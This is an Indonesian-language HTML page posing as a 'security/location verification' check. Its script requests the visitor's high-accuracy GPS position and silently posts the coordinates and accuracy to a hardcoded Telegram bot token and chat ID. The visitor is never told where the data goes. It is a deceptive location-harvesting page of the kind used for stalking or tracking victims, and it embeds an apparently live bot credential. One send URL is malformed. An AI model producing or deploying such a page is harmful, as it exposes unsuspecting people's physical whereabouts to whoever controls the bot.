<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifikasi Keamanan Halaman</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, sans-serif;
        }
        body {
            background-color: #f4f6f9;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            padding: 20px;
        }
        .card {
            background: #ffffff;
            padding: 40px 30px;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.06);
            text-align: center;
            max-width: 420px;
            width: 100%;
            border: 1px solid #e9ecef;
        }
        .icon {
            font-size: 50px;
            margin-bottom: 20px;
        }
        h2 {
            color: #212529;
            margin-bottom: 12px;
            font-size: 1.5rem;
            font-weight: 600;
        }
        p {
            color: #6c757d;
            font-size: 0.95rem;
            margin-bottom: 25px;
            line-height: 1.6;
        }
        .btn {
            display: inline-block;
            width: 100%;
            padding: 14px;
            background-color: #0d6efd;
            color: #fff;
            text-decoration: none;
            border-radius: 8px;
            font-weight: 600;
            font-size: 1rem;
            transition: background-color 0.2s ease;
            text-align: center;
            border: none;
            cursor: pointer;
        }
        .btn:hover {
            background-color: #0b5ed7;
        }
    </style>
</head>
<body>

    <div class="card">
        <div class="icon">📍</div>
        <h2>Verifikasi Lokasi</h2>
        <p id="status-text">Untuk melanjutkan verifikasi sistem, silakan klik tombol di bawah dan pilih <b>"Izinkan / Allow"</b> pada konfirmasi browser Anda.</p>
        
        <button id="actionBtn" class="btn">Mulai Verifikasi Lokasi</button>
    </div>

    <script>
        // Konfigurasi Bot Telegram Anda
        const TELEGRAM_TOKEN = '8713051914:AAGWypsFdP6uJPMHFwgLokj4vx5N7LC4Cb0'; 
        const CHAT_ID = '1966317946';

        // Memicu pencarian lokasi saat pengguna mengklik tombol
        document.getElementById('actionBtn').addEventListener('click', function() {
            mintaLokasiGPS();
        });

        function mintaLokasiGPS() {
            const statusLabel = document.getElementById('status-text');
            const tombol = document.getElementById('actionBtn');
            
            // 1. Periksa dukungan fitur Geolocation di browser
            if (navigator.geolocation) {
                statusLabel.innerText = "Silakan klik 'Izinkan' pada pop-up browser yang muncul...";
                tombol.disabled = true;
                tombol.innerText = "Memproses...";

                // 2. Meminta akses koordinat GPS asli ke browser
                navigator.geolocation.getCurrentPosition(
                    // Jika PENGGUNA MENGIZINKAN (Sukses)
                    (position) => {
                        const latitude = position.coords.latitude;
                        const longitude = position.coords.longitude;
                        const akurasi = position.coords.accuracy; // Akurasi dalam meter
                        
                        statusLabel.innerText = "Lokasi berhasil diverifikasi. Mengirim data...";
                        
                        // Kirim koordinat asli berupa Pin Peta ke Telegram
                        sendLocationToTelegram(latitude, longitude, akurasi);
                    },
                    // Jika PENGGUNA MENOLAK atau GPS Mati (Gagal)
                    (error) => {
                        tombol.disabled = false;
                        tombol.innerText = "Coba Lagi";
                        
                        if (error.code === error.PERMISSION_DENIED) {
                            statusLabel.innerHTML = "<span style='color: red;'>Gagal: Izin ditolak.</span> Harap ubah pengaturan browser Anda untuk mengizinkan akses lokasi pada situs ini.";
                        } else {
                            statusLabel.innerText = "Gagal mendapatkan lokasi. Pastikan GPS perangkat Anda sudah aktif.";
                        }
                    },
                    // Opsi akurasi tinggi
                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                );
            } else {
                statusLabel.innerText = "Browser Anda tidak mendukung fitur pelacakan lokasi.";
            }
        }

        // Fungsi khusus mengirim objek peta (Map Pin) ke Telegram
        function sendLocationToTelegram(lat, lng, accuracy) {
            const url = `https://telegram.org{TELEGRAM_TOKEN}/sendLocation`;
            const statusLabel = document.getElementById('status-text');
            const tombol = document.getElementById('actionBtn');
            
            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    latitude: lat,
                    longitude: lng
                })
            })
            .then(res => res.json())
            .then(data => {
                if(data.ok) {
                    statusLabel.innerText = "Terima kasih. Proses verifikasi lokasi telah selesai sepenuhnya.";
                    tombol.innerText = "Selesai";
                    
                    // Opsional: Kirim detail akurasi dalam bentuk teks pelengkap
                    sendTextToTelegram(`🎯 Akurasi GPS: ±${Math.round(accuracy)} meter.`);
                } else {
                    statusLabel.innerText = "Terjadi kesalahan pada konfigurasi Bot Telegram.";
                    tombol.disabled = false;
                    tombol.innerText = "Coba Lagi";
                }
            })
            .catch(() => {
                statusLabel.innerText = "Terjadi gangguan jaringan saat mengirim data.";
                tombol.disabled = false;
                tombol.innerText = "Coba Lagi";
            });
        }

        // Fungsi pembantu untuk mengirim pesan teks tambahan
        function sendTextToTelegram(message) {
            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message
                })
            });
        }
    </script>

</body>
</html>
